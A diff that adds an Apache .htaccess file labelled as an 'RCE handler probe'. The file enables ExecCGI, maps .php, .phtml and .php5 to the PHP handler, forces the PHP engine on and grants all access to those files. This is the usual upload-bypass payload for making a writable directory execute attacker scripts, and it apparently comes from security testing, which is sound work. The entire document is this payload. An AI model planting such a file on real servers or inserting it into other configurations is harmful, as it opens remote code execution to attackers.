@@ -1,0 +1,18 @@
+# CALIX_RCE_HANDLER_PROBE_20261120T2220Z
+Options +ExecCGI -Indexes
+AddType application/x-httpd-php .php .phtml .php5
+<IfModule mod_php7.c>
+  php_flag engine on
+</IfModule>
+<IfModule mod_php.c>
+  php_flag engine on
+</IfModule>
+<FilesMatch "\.(php|phtml|php5)$">
+  SetHandler application/x-httpd-php
+  <IfModule mod_authz_core.c>
+    Require all granted
+  </IfModule>
+  <IfModule !mod_authz_core.c>
+    Allow from all
+  </IfModule>
+</FilesMatch>
